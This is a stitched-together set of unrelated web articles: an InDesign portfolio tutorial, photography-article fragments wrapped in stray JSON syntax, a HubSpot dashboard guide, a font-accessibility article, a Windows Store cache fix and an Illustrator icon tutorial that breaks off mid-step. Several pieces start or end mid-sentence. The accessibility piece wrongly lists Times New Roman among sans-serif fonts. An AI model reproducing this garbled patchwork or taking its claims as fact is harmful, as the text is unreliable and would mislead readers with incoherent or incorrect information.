online. \nRoll-up Banner for Property Promotion \nThis layout is suitable for any project purpose.

We'll need to decide the orientation and dimensions of our portfolio template. \nPortfolios are particularly fun to design, because you often have a lot of freedom to decide on the best way to feature your work. You might choose to go with something traditional, or maybe you'll go with a square shape or even a long format. Consider your options and what might be the best way to present your work. \nIn this example, we're going to work in a square format, 10\" Wide by 10\" High . \nStep 2 \nBefore we finalize our document setup, let's address a few additional attributes. \nI set my Margins to 0.5\" on the Top, Bottom, and Outside . On the Inside , I set my Margins to 0.75\" , just a little extra, to accommodate the space that may be lost between my pages. \nStep 3 \nI also wanted to add a 0.125\" Bleed to my document. \nIf an image is \"Full Bleed\", it generally means that the imagery/content goes to the edge of the page, without any border or \"white space\". If we want something to be full bleed, we often have to extend our work to the bleed area, to allow for trimming when our work is printed and prepared. \nOnce you're happy with your settings, click Create to accept and start up your document. \nIf you've made a mistake or you change your mind, don't worry\u2014you can always go back and change these settings via File > Document Setup . \n2. How to Create Our Interior \nStep 1 \nLet's start creating our portfolio interior within a Master Page . \nMaster Pages are often used as a template of sorts\u2014we can apply elements that we lay out in our Master Pages to the Active Pages in our document. \nMaster Pages are located within the top portion of the Pages panel. If you don't see the Pages panel, you can open it up via Window > Pages . \nStep 2 \nGo \"inside\" of A-Master , our first Master Page , by double-clicking on it. That's where we'll start laying out our composition. \nPortfolio pages essentially need to show off our work\u2014there needs to be an emphasis on the portfolio piece itself. However, we also want to do so in a visually engaging and interesting way. \nBefore I started placing imagery, I decided to \"block out\" my composition with gray rectangles, using the Rectangle Tool . The Fill is set to 25% gray. I find this to be a simple way to experiment with your composition or create a thumbnail. \nStep 3 \nOnce I had some rectangles placed, I created Guides, based on my layout elements. To do so, Click and Drag from the Document Rulers at the sides of your document. \nThese Guides are inspired by the gray rectangles I placed. \nStep 4 \nNext, I started placing text based on the Guides I had created. Use the Text Tool to place text. \nKeep in mind the text that you'd want featured in your portfolio. It's generally a good idea to have the title of the piece, the date it was created, and a description. You might also want an artist's statement of some kind, to further explain your process or intention. \nLet's start with our title. In terms of hierarchy, it should likely be the text with the most visual importance\u2014so I'd like it to be rather large on the page. \nStep 5 \nI decided to add supplemental text, under the title, using the Text Tool . This felt like a great place to have key information that the viewer would need to know right away\u2014like a brief description of what it is and the date of creation. \nAgain, think about hierarchy. This is more supplemental type, so I made it smaller. \nStep 6 \nNow, let's add two spaces for some more supplemental type\u2014this could be a great place for additional comments, insights, or statements on the work. Again, use the Text Tool . I wanted this type to be the smallest, because it is meant to be the most supplemental\u2014it's our body copy. \nStep 7 \nTo push the aesthetic further, I decided to add some lines using the Line Tool . Note that they are inspired by the existing layout elements. \nThe Guides , in the example below, have been Hidden (via View > Grids and Guides > Hide Guides ) so it's easier to see the lines. \nStep 8 \nThe footer area could include any supplemental information you like. In the case of my composition, I decided I wanted to stick with page numbers. \nTo insert page numbers, first create a Text Box using the Text Tool . \nThen, go to Type > Insert Special Character > Markers > Current Page Number . \nYou'll notice that they read \"A\"\u2014this is OK! Remember, we're working in A-Master, a Master Page, so that technically is the page number. \nI decided to make my page numbers large, but a light gray, so their low contrast helps keep them supplemental in the hierarchy. \nStep 9 \nFinally, let's insert some imagery. Select the Rectangle Frame that you want to place your imagery into. Then, go to File > Place , and select your image. \nDouble-click on the Rectangle Frame to toggle between selecting the frame itself and the contents inside it. You'll know you've selected the contents when the border around it is in red. \nResize and adjust your imagery until you're happy with how it's cropped. \nStep 10 \nRepeat this process for your other rectangle frames. You could use these spaces for close-ups or other shots of your work. \n3. How to Apply Our Master Pages \nStep 1 \nNow that we've created a layout within a Master Page, let's apply our Master Pages to our Active Pages. \nFirst, Create New Pages . Let's make sure we have three pages in our Pages panel. Click on the New Page icon in the Pages panel to create a new page. \nStep 2 \nNotice that your pages have an \"A\" Icon on them. This means they are derived from our A-Master Page . \nTo further illustrate this idea, select the first page in your document. Then Select [None] in your list of Master Pages and drag it to your active page. You'll notice that it goes blank\u2014because, now, it isn't derived from any Master Page. \nStep 3 \nLet's go to Page 2 and 3 of our document. You'll notice that these two pages are derived from A-Master Page . \nHowever, when you try to click on parts of your layout, nothing will happen. It's all locked up. \nTo make edits locally, within individual pages, hold down Shift-Command (on Mac) or Shift-Control (on PC) while clicking on an element of your layout. This will make it editable. \nStep 4 \nLet's test this premise out by inserting new portfolio imagery into pages 4 and 5 of our portfolio. \nFirst, create two New Pages . \nStep 5 \nThen, select the image areas by holding down Shift-Command (on Mac) or Shift-Control (on PC) while clicking. \nDouble-Click to select the contents of the Rectangle Frame and Delete it. \nRemember, we're deleting the contents here\u2014not the frame itself! \nStep 6 \nNow, let's insert our imagery. Select the rectangular frame. Go to File > Place , and then select your image file. \nNow, you should have a new image in this rectangular frame\u2014the one from our template has been replaced. \nStep 7 \nRepeat this process in the other image areas in your layout. You could use the same image, close-up shots, or a different, applicable supplement here. Again, it's up to you and what's best for your portfolio presentation. \n4. How to Create a Cover \nStep 1 \nNow that we've created our interior pages and practiced editing them for different portfolio pieces, let's make a cover for our work. \nBefore we begin, just a note\u2014make sure to ask your printer about any questions or file requirements that might apply to your project. For example, your cover will vary from your interior, as it has a spine. Adapt your composition as needed. \nLet's start by creating a New Master Page . It should be called B-Master , and it will likely appear as a two-page spread by default. \nStep 2 \nDelete one of the pages in B-Master , so you're left with a one-page spread. This is going to be our front cover. \nI wanted the front cover to feature some compelling imagery. A cover often has to compel the reader to open the book up\u2014so it's time to shine! \nPlace the imagery by going File > Place . Adjust the rectangle frame and Crop your work as desired. \nStep 3 \nThen, I added a rectangle frame on top of the imagery with a White Fill . \nTo add transparency, select the rectangle frame and Right Click (on PC) or Control Click (on Mac) . From the resulting dropdown menu, select Effects > Transparency . \nI set my Transparency to 90% . \nStep 4 \nNext, I added some type using the Text Tool and a line using the Line Tool . \nYou could place any type here that you find most appropriate\u2014but feel free to follow my example on this! Remember, there's no wrong answer\u2014you know what's best for your work! This is your time to shine. \nStep 5 \nI decided I wanted the back cover to be more supplemental. \nCreate another New Master Page for the back cover. This one will be called C-Master . \nAgain, delete one of the pages in C-Master , so we have a one-page spread. \nStep 6 \nSince this is the back of the booklet, I placed an image but left it small, and reused the contact info from the front cover, using the Text Tool . \nMy goal was to create something supplemental yet uniform with the rest of the book. \nStep 7 \nNow, just like with our other Master Pages, we can apply B-Master and C-Master by clicking and dragging them to an active page. \nCreate a New Page , so our document ends with Page 6 . \nPage 1 and Page 6 are single pages\u2014apply the front and back cover to these pages. \n5. How to Use Your Template \nStep 1 \nNow that we're wrapping up our template, how do we use it? \nYou could save your work as an InDesign File (or indd file) , but you could also save it as an InDesign Template file (or indt file) . \nWhen you go to save your work (by going File > Save ), you can find these options under Format . \nStep 2 \nWhat's the difference? Unlike a \"standard\" InDesign file, an InDesign Template file can either be opened as an \"original\" (where you edit the template itself) or as a copy\u2014where a new, untitled document is opened, based on your template. \nSee how that could come in handy? \nAnd There You Have It! \nThanks so much for joining me on this InDesign portfolio walkthrough! Hopefully, you have some extra insight into how to create a portfolio or how to make a brochure design. I hope you found these techniques helpful\u2014good luck with your portfolio, and your creative projects! \nLooking for some extra inspiration, or even some extra help?

      "title": "Six tips to help you get perfect photo prints",
      "text": "There are many reasons to print your photos , we\u2019ve urged you to do it dozens of times. Having your images printed has plenty of good sides, but it comes with a set of questions that makes most of us confused. In this video, Aaron Nace of PHLEARN teams up with Xander Fischer of Print Lab Chicago to talk about this topic. They answer some of the most asked questions about photo printing and give you tips that will help you get perfect prints every time. \nVIDEO \n1. The photo looks different in print than it did on the computer \nThe first thing to think about is the brightness: you\u2019re dealing with a backlit image on the screen, which is brighter and with more saturated colors than the print will be. Also, if your print is going to be displayed in a relatively dark room, it will look darker and maybe even a bit washed-out. So, before printing, darken your monitor a little. Use Curves to brighten up your image a bit, and if you\u2019re printing on matte paper, lift the shadows a bit too. \n2. Does your monitor need to be calibrated? \nCalibrating your monitor certainly has its purpose and its perks. However, if you don\u2019t have a dedicated print monitor, Xander notes that calibrating the monitor won\u2019t really solve all your problems. But worry not, if you send your photos to a professional printing service, they should take care of it. \n3. Do you need to convert files to CMYK before printing? \nThis is what I encountered at least 70% of the times when I sent my photos to print shops. \u201cPlease convert it to CMYK and then send it to us.\u201d But Xander appeals to all of you: don\u2019t send photos in CMYK to print shops, as its color space is smaller than RGB or sRGB color space. It only makes sense if you\u2019re going to an offset press, but your fine art prints aren\u2019t made like that, so\u2026 Leave them in RGB: Adobe RGB (1998) works best, according to Xander. \n4. How big can you print and what DPI or resolution do you need? \nDPI/PPI and resolution are confusing for many photographers when it comes to printing. How big can you print at what resolution and what DPI? Does your camera resolution matter? Ugh, so many questions! Xander explains in the video a bit about resolution, DPI, print size and viewing distance, which are all connected. And you can learn more about it in this brilliant video from Thomas Kuoh . \n5. What is a print profile (ICC)? \nA print profile basically makes sure that you get the most accurate color and detail in your prints. Xander notes that ICC profiles are very particular: every printer has a separate profile for every paper. And professional print labs calibrate every printer for every paper they use to give you perfect prints every time. \n6. What is the best paper for photos? Is there such a thing at all? \nThere are different kinds of photo paper and not the same type will work for different images. Some images look great on glossy, while the others can look just terrible. For example, product and fashion photos usually look good on glossy paper, while matte is a better choice for foggy landscape photos. So, in short, there is no universal answer and there\u2019s no such thing as \u201cbest paper.\u201d You should choose a paper that will enhance the subject of your photo. \nExtra tip: framing \nFraming can also add a lot to the beauty of your image if it\u2019s done right. Xander recommends framing in a glass if your photo is displayed somewhere where there\u2019s a lot of foot traffic. But if you\u2019re framing it for an exhibition or simply in your home, then avoiding glass is a good idea because you\u2019ll avoid reflections and glare. \nI hope that these tips have helped you learn more about printing (and perhaps stop worrying about some aspects of it). Make sure to watch the entire video for a more in-depth explanation, it\u2019s very fun and filled with useful information.",

      "text": "The Canon EOS R Mark II is already being tested out in the wild, report says \nDecember 10, 2019 by John Aldred Leave a Comment \nSo, this will make, what? 4 new Canon bodies expected in the relatively near future? There\u2019s the EOS 1DX Mark III , an EOS 1DX-like mirrorless , a super high resolution \u201c EOS Rs \u201d and now an EOS R Mark II is already being tested, according to Canon Rumors . \nThe Canon EOS R was announced only just over a year ago in September 2018 , and it seems crazy to replace it so quickly, although a Mark II was already rumoured to be on Canon\u2019s roadmap as recently as October . The EOS R, while rather good, isn\u2019t perfect, and Canon is playing catch up to Sony in some respects, so a short initial release cycle isn\u2019t too crazy. \nThe common wishlist for an EOS R replacement typically only contains three items to bring it up to the level of the competition. \nDual card slots \nStop cropping 4K video \nIBIS \nThe IBIS thing is being worked on , according to Canon, at least for some bodies . So, seeing all three of these issues addressed in an EOS R successor isn\u2019t out of the realm of the possibility. It\u2019s expected to receive similar ergonomics to those rumoured for the EOS Rs. \nEven though it\u2019s only been slightly over a year since the EOS R was initially launched, it\u2019s not uncommon for camera companies to release a successor or alternative product line shortly after a product is released. Nikon released the D610 only a year after the D600 due to countless problems with the D600 . Sony, too, released the A6500 only a few months after the A6300\u2019s overheating issues came to prominence. \nCR has said that they expect to receive specifications for the EOS R Mark II soon. If it is out testing in the wild already, then we may see an announcement in the next few months. Possibly in February along with the \u201cEOS Rs\u201d, although we may have to wait until Photokina in May. \nWhat do you want to see fixed or added to the EOS R Mark II? \n[via Canon Rumors ]",

      "text": "VIDEO \nLight is one of the key elements of photography, and product photography is no exception. If you\u2019re just starting out, it\u2019s certainly good to learn how to work with light and get the look you want. In this video, Jay P Morgan shows you how to create simple lighting setups with just one or two lights and how to control the light so that you achieve different results. \nIn his previous videos, Jay showed us how a cube , a sphere , and a cylinder react to the laws of light. Before you watch the video above, I strongly suggest you watch the previous ones. In real life, you\u2019ll often have these shapes combined, and the products you\u2019re photographing will take these shapes (or at least similar). So, in the video above Jay shows you a step-by-step guide on how to tackle situations when you shoot product photography and have several of these objects combined. \nFirst of all, you can achieve different looks with just one light. Place a soft, diffused light at around 45 degrees of your subject for the highlights. To control how much of the shadows you want, add a bounce card on the opposite side and move it closer or further away from the subject to control the shadows. By rotating the main light to or from the background, you also control how light or dark the background is going to be. \nYou can add the second light to the setup, too. Keep the large, diffused source of light that wraps around your subject and add a harder light source to on the opposite side, at around 45 degrees from the back. It will create specular highlights on shiny items and add an interesting highlight on the back of the products. You can control it with barn doors to achieve exactly the look you want. Again, you can add a little bit of fill to add more \u201cdimension\u201d to the shot. \nAlternatively, you can use the second light to light the background instead of lighting the product. You can play with the angles and the position of the light, depending on the look you want to achieve on the background. \nInstead of putting the main light to the side, you can place it above and behind the subject to create the \u201ctop backlight.\u201d It adds a nice separation on the top of the subject, and the shadows are deeper, falling towards the ground. You can, once again, control the shadows on the sides by adding white fill cards. \nMake sure to watch the entire video, because you\u2019ll see plenty of examples and understand better how shapes react to hard and soft light, and how you can control it. And of course, feel free to experiment and try things out yourself, it\u2019s as fun as it is useful to do it.",

      "text": "7-MINUTE READ \u00b7 By Edward Ford \nWhat is a HubSpot Reporting Dashboard? \nWhen we talk about HubSpot reporting dashboards, you\u2019re likely to think about your dashboards within HubSpot itself. These can provide you with valuable insights into your marketing and sales performance by grouping together and displaying key metrics from up to ten different reports. \nBut besides HubSpot\u2019s native functionality, you can also create custom dashboards by importing your HubSpot data into a number of third-party tools. These could be spreadsheet tools like Google Sheets or Microsoft Excel , or data visualization and dashboarding tools like Google Data Studio . \nThere\u2019s a number of reasons why HubSpot users might want to create dashboards outside of HubSpot, but let\u2019s have a look at two of them: \nFirstly, you\u2019re unable to bring data from your other key services into HubSpot, which means that your dashboards won\u2019t provide you with overviews of your total marketing and sales performance. \nSecondly, creating dashboards outside of HubSpot gives you access to greater customization and visualization options. This can make it easier to understand your data and drill deeper into your numbers. \nIn this article we\u2019ll outline the exact steps of how you can build rich, customized, and comprehensive dashboards for your HubSpot data in Google Data Studio. \nBest Practices for Building Marketing Dashboards \nYour HubSpot reports play a key role in helping you understand how you\u2019re performing on a daily, weekly, and monthly basis, so it\u2019s important that your dashboards set up to provide you with the most useful data possible. Here are five tips to keep in mind when creating a new dashboard: \nChoose one specific topic to build your dashboard around. \nDecide what you want to achieve and only track the metrics and KPIs that will help you do so. \nPresent your data clearly and logically by carefully considering your visualization options. \nTrack the customer lifecycle in full by combining marketing and sales data. \nDesign your dashboards in a way that ensures they point towards actionable steps for improvement. \nTo dig a little deeper, have a look at our four rules for creating the perfect marketing reporting dashboard . \nBuilding Dashboards Inside HubSpot \nHubSpot provides you with default reporting dashboards that are split up into the categories of marketing, sales, and service. These are composed of up to ten reports that focus on the most valuable metrics for those departments. \nYou can also create custom dashboards that feature up to ten reports of your choice. HubSpot Professional users can only create one custom dashboard, whereas Enterprise users can create 25. Due to the fact that you\u2019re using an all-in-one platform that\u2019s likely to store the majority of your data, these dashboards are relatively easy to build. You simply find or create the reports that you want to be included and then add them to your dashboard. \nWhile incorporating both marketing and sales reports into your dashboards is possible, it can be time-consuming to find the relevant data from your Marketing and Sales Hubs. Purchasing the HubSpot Reporting Add-on improves things here, as it allows you to create up to 200 custom dashboards that make it easier for sales and marketing teams to track the key metrics that they\u2019re accountable for. \nThe only problem is that the customization and visualization options of HubSpot dashboards are limited. HubSpot dashboards simply group together your reports and display their original visualizations, which are rather simple in nature and not suited to a deep analysis of your numbers. With customization options, you can resize reports and change their position on your dashboard, but that\u2019s about it. \nUsing Third-Party Dashboard Tools for Reporting and Visualizing HubSpot Data \nThe limitations we just covered, coupled with the fact that you\u2019re unable to bring data from outside sources into HubSpot, means that many marketers choose to build their dashboards with third-party tools . \nIf you want access to a broader range of visualization options, for example, then data visualization and dashboarding tools like Google Data Studio and Geckoboard are very useful. They allow you to create visually striking dashboards that can be easily understood and shared with colleagues or displayed on big screens. They also offer a more robust set of customization options than you will find on HubSpot. \nTools like Google Data Studio and Grow also let you import data from multiple sources and build dashboards that provide a definitive overview of your marketing and sales performance. \nBy using the right connector app, such as Supermetrics for Google Data Studio , you can also automate the pulling of your data so your dashboards automatically refresh as often as you wish. \nUsing Supermetrics to Create a HubSpot Reporting Dashboard \nSupermetrics makes it really simple for you to pull data from your key platforms, including HubSpot, and bring it into tools that are better suited for data monitoring and analysis. By using Supermetrics to bring all of your marketing and sales data into tools such as Google Data Studio and Google Sheets, you\u2019re able to create automated, interactive, and visually impressive dashboards that clearly present the totality of your data. \nThere are three options for building your perfect marketing dashboard with Supermetrics. Let\u2019s briefly take a look at each one: \nSupermetrics + Google Data Studio \nGoogle Data Studio is a free visualization platform that makes it easy to create beautiful and interactive dashboards. Seeing as it\u2019s a particular favorite of ours, we\u2019ll take a closer look at how to make a HubSpot dashboard with Google Data Studio and Supermetrics below. \nSupermetrics + Google Sheets or Microsoft Excel \nGoogle Sheets and Microsoft Excel are popular reporting tools that allow you to analyze your data in depth and customize your reports as you wish. Supermetrics for Google Sheets and Microsoft Excel provide native integrations with HubSpot and other key tools, while also allowing you to automate your dashboards. \nSupermetrics API \nSupermetrics API lets you connect your HubSpot and other marketing data with BI tools like Database, Power BI, and Tableau, which is ideal if you want to create more advanced dashboards. \nBuilding the Ultimate HubSpot Reporting Dashboard with Supermetrics and Google Data Studio \nHere\u2019s a step-by-step outline of how you can use Supermetrics to create a HubSpot reporting dashboard in Google Data Studio: \nConnect your data \nUnder the data sources tab, click on the \u201c+\u201d icon in the bottom right-hand corner to create a new data source. Search for the HubSpot by Supermetrics connector and click on it. You can then select your account and conversion window, give your data source a name, and finally click on connect to create your data source. \nCreate a new data source \nSearch for the HubSpot by Supermetrics connector and click on it \nTransform data \nYou\u2019re now able to rename fields, format fields, and carry out other data transformations on the data source level. \nCreate a new report \nClick on the \u201cadd to report\u201d button and add the HubSpot by Supermetrics data source to your report. \nVisualize your report \nYou\u2019ll be able to choose from over 30 types of visualization charts, which include tables, scorecards, time series, bars, pie charts, and geo maps. As an example, let\u2019s select the time series chart. \nAdd dimensions and metrics \nDrag and drop your dimension and metrics from the data panel. As an example, we\u2019ll visualize contacts by date. \nAdd filters \nYou can now add chart level filters to exclude or include certain types of data that you may or may not want to show. You can also add a date range for your chart and apply filter controls to get additional insights. \nCustomize your dashboard \nAccess the style panel to change the look and feel of individual visualizations or your whole report. Customization options include changing the background color of charts and reports, setting a custom size for the report, and adding legends for charts. \nShare it with your team \nClick the \u201cshare the report\u201d icon in the top right-hand corner to share your new HubSpot dashboard with the rest of the team. \nIf you don\u2019t want to create your marketing reports from scratch, then why not try one of the free templates from Supermetrics for Google Data Studio , Google Sheets , and Microsoft Excel ? \nIn Summary \nHubSpot reporting dashboards should provide essential summaries of how you\u2019re performing as a marketing team. By using Supermetrics to bring all of your marketing and sales data together, you\u2019re able to superpower your dashboards and ensure that they\u2019re more useful and actionable. \nWhy not see for yourself?

      "text": "Font types, font design and typography can have a huge impact on the legibility and visibility of designs for visually impaired viewers, a consideration that print and web designers often overlook. \nChoosing the right type of font style to use on your print layout or website to improve accessibility doesn\u2019t need to be difficult or to compromise the overall aesthetic of your design. Here, you can find out more about how different types of fonts and font design can affect visually impaired viewers, and how you can make instant improvements to your designs. \nHow Do Font Choice and Typography Affect Visually Impaired Individuals? \nAccording to the World Health Organisation (WHO), at least 2.2 billion people have a vision impairment or blindness , which means that an astonishingly high percentage of 28.5% of the world\u2019s population have some form of vision impairment. \nHow You Can Use Adobe Software to Improve Accessibility on Your Designs \nIt\u2019s important that as many people as possible are able to engage successfully with digital designs. In this article, we look at some of the ways large... \nGrace Fussell \n03 Dec 2018 \nBuilding an Inclusive Web: Why Accessibility Matters \nIn this article I\u2019ll share my point of view about why accessibility is important; from empathy and what is simply \u201cgood business\u201d, through to selfishness and... \nSami Keijonen \n03 Dec 2017 \nVisual impairment falls broadly into three categories, which have different or overlapping effects for how those affected interact with type-based designs: \nColor blindness means that while the shape of text is not distorted, the color of text can be difficult to perceive, and the distinguishment between colors can be more difficult. Color-blind individuals can also be sensitive to color brightness. \nLow vision (or low visual acuity) means that an individual can have partial sight in one or both eyes, blurry vision, tunnel vision, central field loss, and/or clouded vision. Designs with small-scale text or click targets can be difficult for affected users to read or see. While some individuals use specialist built-in browser zoom or screen magnifiers like ZoomText for browsing websites, many non-technical users are not aware of, or don\u2019t know how to use, these extensions. \nBlindness is the substantial loss of vision in both of the eyes. For printed and physical text, blind individuals have relied on Braille text, while blind internet users often turn to screen reader technology, which turns on-screen content into speech or shows it on a Braille display. The most popular screen reader software for Windows devices is JAWS (Job Access With Speech), while Apple users commonly use VoiceOver . \nOther specific symptoms of visual impairment which can affect how individuals interact with text include: \nVisual snow, glare, ghosting , and cataracts \u2014symptoms which can affect the clarity, position and number of occurrences (double vision) of text. \nNystagmus , which is characterized by rapid, involuntary, oscillatory movement of the eyes, can give the impression that text is jumping around or disappearing. \nAn obstructed visual field , which includes floaters, an obstruction to one side (retinal detachment or hemianopia), obstructed central vision (glaucoma), spotty vision (diabetic retinopathy), or obstructed peripheral vision (retinitis pigmentosa or macular degeneration), can limit the individual\u2019s field of view, meaning that some parts of the text in a design might not be visible. \nAn Example of Accessibility and Inaccessibility in Practice \nLet\u2019s look at an example of how the choice of fonts and formatting of typography could affect the accessibility of a site for visually impaired individuals. \nThe New Yorker has been praised by type aficionados for its elegant use of typography. On the magazine\u2019s website, the quirky and custom-designed serif font, NY Irvin, is balanced with geometric sans serif Neutraface and traditional serif Times New Roman. \nAs a publication with an intelligent reputation, The New Yorker has a text-heavy website , featuring a masthead and central headline teaser, alongside a number of other article titles around the periphery. \nAs stylish and aesthetically balanced as it might be, the typography presents a number of issues which commonly limit the accessibility of such sites to visually impaired users. \nThe New Yorker website performs poorly on three occasions, when faced with users with symptoms of low acuity (blur), ghosting, and a blocked visual field. These images were generated using the NoCoffee vision simulator, a browser extension which allows web designers to assess the accessibility of sites. \nAn individual with low acuity would struggle to read the text set at a smaller scale, such as the article teasers in the left and right columns, as well as body text in the headline area. \nIf an individual experiences ghosting (also known as double vision or diplopia), the website text becomes nearly completely illegible. The ornate style of the serif font is no doubt an exacerbating factor in this, as the shape of individual letters is not instantly perceptible when overlapping. \nIn the case of a partially blocked visual field, the fact that the layout is text-heavy and scattered around a wide area adds to the inaccessibility of the site. In the case of peripheral vision (commonly a symptom of either glaucoma or retinitis pigmentosa), the outlying articles become more and more difficult to see. \nThe website performs much better, however, on three other counts. If an individual has color deficiency (such as protanopia, red-green color blindness), only the images are generally affected, with the black text set against a white background proving to be a clear and legible color choice. \nIn the case of contrast loss, the high-contrast monochrome palette also counteracts the effect of visual \u2018graying\u2019. Users with cataracts, who commonly experience a clouded field of vision as a result, will also benefit from the high-contrast color of the text. \nBased on all of these observations, the type designers behind The New Yorker are doing some things well for visually impaired users, but there are significant issues that could be changed to improve accessibility. \nWhile the black-and-white contrast of the text improves readability, the choice of a stylized serif font, small sizing of text and the quantity and scattering of text around the layout equate to a design that\u2019s high on style but low on accessibility. \n6 Steps You Can Take to Improve the Accessibility of Type in Your Designs \nMaking the type on your print or digital designs more accessible isn\u2019t difficult. Below are six steps you can take to improve the legibility and overall visibility of fonts and typography. \nUse Common Sans Serif Fonts \nCurrently, Section 508 of the Rehabilitation Act of 1973 does not pin down the requirements for choosing accessible typefaces. However, the US Department of Health and Human Services has recommended the following fonts for PDF documents: Times New Roman, Verdana, Arial, Tahoma, Helvetica, and Calibri . \nThese fonts tick two accessibility boxes. First, they are sans serifs . Lacking the extra flourishes featured on serif fonts that can impair readability, sans serifs are generally much easier to read. \nSecondly, these are common fonts , which as a result are less likely to be replaced on websites and are also processed more frequently by readers, making the style of the font more invisible and the text more readable. \nStick to One or Two Fonts in a Design \nMultiple fonts can distract from the task of reading, which adds extra strain for a visually impaired viewer, so limit the number of fonts on a print or web layout to a maximum of two or ideally just one font. \nIncrease the Size of Type \nUse a minimum font size of 12 pt for web and print designs, but aim for even larger to improve visibility. The British government website , for example, uses a minimum font size of 19 pt. \nEnsure key titles, calls to action, and important items of information are set in a large font size. \nMaximize Color Contrast \nMake sure the contrast between text and the background is as high as possible. Setting black text against white, and vice versa, is the obvious choice, but using colors from opposite ends of the spectrum will also help to maximize contrast in the case of color blindness. \nTip: Use a contrast checking tool to ensure that the color choices you\u2019ve opted for are as contrasting as possible. \nAvoid Animations \nText that flashes, moves or disappears is not only potentially irritating for the majority of website users, but it can exasperate visual impairment issues, especially in the case of nystagmus (flutter). \nAvoid Using Italic and UPPERCASE Styles \nSkewing and compressing text, as is the case with italicized type, reduces legibility, as does setting text in all caps. If you want to distinguish certain parts of your text, opt instead for a bold weight or increased font size. \nAvoid Using Novelty or Display Fonts \nNovelty font styles tend to be more stylized than sans serifs and serifs, meaning that there is an extra layer of visual information to process. Extra texture, decoration or flourishes increase the complexity of the font and reduce legibility. For a visually impaired viewer, this adds another task on top of the strain of trying to reading the text. \nWhen Designing Fonts, Aim for Clarity and Distinction \nFont designers love to experiment with new type styles, shapes, textures and colors in their designs. While this can result in a unique and eye-catching font, it doesn't necessarily mean the font is optimized for the visually impaired. \nWhen designing your own fonts, aim to make the letters both clear and distinct from one another. \nImprove the clarity of your letters by sticking to a clean, fuss-free sans serif style. Some lowercase letters like 'd' and 'b' can be easily confused, so make sure to create a distinction between letters that could be mixed up. \nConclusion: Improving the Accessibility of Fonts in Your Designs \nBy keeping accessibility requirements at the forefront of your mind while you design fonts or use them on print media or websites, you\u2019ll ensure that your designs are going to be as accessible as possible for visually impaired users. \nWhile legislation regarding font use on websites isn\u2019t set in stone yet, pressure is growing on businesses to accommodate users with a visual impairment or other disability. Design is an area that can have a significant impact on the accessibility of media, so it\u2019s increasingly important for designers to be aware of the needs of visually impaired individuals and to act on them in the work they produce. \nTo find out more about how to improve accessibility in your designs, check out these handy articles: \nHow You Can Use Adobe Software to Improve Accessibility on Your Designs \nIt\u2019s important that as many people as possible are able to engage successfully with digital designs.

      "text": "How to deal with tricky reflective surfaces and create stunning product photos \nSeptember 23, 2019 by Dunja Djudjic Leave a Comment \nVIDEO \nWhen doing product shots in the studio, reflective surfaces could be very tricky to handle. But of course, there are methods to deal with them and light them to show all their beauty. In this video, Dustin Dolby of Workphlo shares a comprehensive tutorial on lighting and photographing tricky, reflective products. And what\u2019s more, you don\u2019t need fancy gear. Prepare simple lighting modifiers, your DIY spirit, and Photoshop. \nDustin uses a YONGNUO YN560 IV speedlight paired with a Yongnuo CA-63YN-560TXC YN560-TX transmitter and photographs a watch. He shares a few approaches to lighting a reflective object such as a watch. He fires the flash through a diffuser (you can use a DIY one or the one that comes with the 5-in-1 reflector ). He also uses a $10 IKEA lamp, a trick he already showed us in one of his previous videos . In addition, Dustin shows you how to use a stripbox in this setup. The trick is to light the different areas of the product separately to achieve the results you want. \nOther than the shooting setup, Dustin also shares the editing process. He relies on Photoshop here, combining several shots to get the desired result. The editing workflow begins around 8:56 of the video, and Dustin shows you the step-by-step process of creating the final shot. \nMake sure to watch the entire video for plenty of ideas and the entire process of shooting and editing photos. It will help you get professional-looking images of reflective products even without professional lighting.",

But in Windows 10 Microsoft Windows store not only lets you download the apps also helps you to update the Windows 10 built-in apps such as News, Weather, 3D builder and more. \nBut sometimes it might not be work properly due to corrupted Windows Store and not be able to update your apps or it may keep offering you to update the app again and again. \nFix Microsoft Store keeps updating the same apps \nIf you are not asked to update your Store app or you are not able to update the app in Store then this might be due to Windows Store cache issue or some other glitches. Let\u2019s have a look to solve this issue. Read the instruction carefully and you don\u2019t need any kind of special computer expertise to do this. \nAdvertisement \nMethod 1: \nRun Windows Store Apps Troubleshooter \nWindows troubleshooter is very thing to do first because it helps you to solve many errors and issue automatically.

To do this, open folder C:\\Windows\\System32 and look for WSReset.exe file. \nRun this app as an administrator by right-clicking on it. After opening this file, navigate to this path \nC:\\Users\\<username>\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\LocalState \nand check for the folder name cache . In the given path replace <username> with your own Windows user name. \nIf found then rename it to cache.old and create a new folder with the name cache. That\u2019s it, now restart your computer and your problem will be gone. \nMethod 3: \nReset Microsoft Store settings \nIn the latest version of Windows 10, it allows you to reset apps to default without losing user data which helps us to solve many errors, issue and we don\u2019t have to install Windows again if anything goes wrong. \nLearn more: How to reset Windows 10 PC? when it\u2019t not running smoothly. \nTo reset Windows store settings, first open Settings by pressing Windows + I keyboard shortcut.

      "text": "In today\u2019s tutorial, we\u2019re going to take a look behind the process of creating a compass icon, and learn how to build one of our own. \nSo, assuming you\u2019ve poured yourself a fresh cup a coffee take a quick sip out of it and let\u2019s get started! \nTutorial Details: Compass Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2018 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 20 Minutes \nFinal Image: Compass Icon \nStep 1 \nAs always, we\u2019re going to kick off the project by setting up a New Document by going to File > New (or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nStart working on the actual compass, by creating the main shape for the outer section of its frame using a 52 x 52 px circle with a 4 px thick Stroke ( #443D38 ), which we will center align to the underlying Artboard , giving us a 4 px all-around padding to work with. \nStep 3 \nAdd the inner section of the frame using a smaller 40 x 40 px circle with a 4 px thick Stroke ( #443D38 ), which we will position to the center of the larger one. Once you have the shape in place, select and group both circles together using the Control-G keyboard shortcut. \nStep 4 \nCreate the orientation plate using a 28 x 28 px circle, which we will color using #64E89A , and then center align to the shapes that we\u2019ve just grouped. \nStep 5 \nAdd the orientation points using four 4 x 4 px circles ( #443D38 ), which we will position onto the plate as seen in the reference image. Take your time and once you\u2019re done, select and group them and the plate together using the Control-G keyboard shortcut. \nStep 6 